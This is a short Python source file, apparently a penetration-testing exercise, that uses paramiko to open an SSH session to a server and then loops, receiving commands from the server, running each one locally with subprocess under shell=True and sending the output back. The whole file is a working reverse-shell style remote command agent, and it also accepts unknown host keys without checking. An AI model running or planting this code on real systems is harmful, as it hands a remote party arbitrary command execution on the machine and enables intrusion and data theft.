# SSH client which interprets commands send by server

import logging
import paramiko
import subprocess


BUFFER_SIZE = 1024


def ssh_command(ip, user, password, command, keys_path=None):
    client = paramiko.SSHClient()
    if keys_path is not None:
        client.load_host_keys(keys_path)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=password)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(BUFFER_SIZE))  # banner
        while True:
            command = ssh_session.recv(BUFFER_SIZE)  # get command from the SSH server
            try:
                output = subprocess.check_output(command, shell=True)
                ssh_session.send(output)
            except subprocess.CalledProcessError as e:
                message = f"Process error: {e}"
                logging.error(message)
                ssh_session.send(message)
            except OSError as e:
                logging.error(f"Error: {e}")
                break
        client.close()


if __name__ == '__main__':
    ssh_command('localhost', '<username>', '<password>', 'ClientConnected')
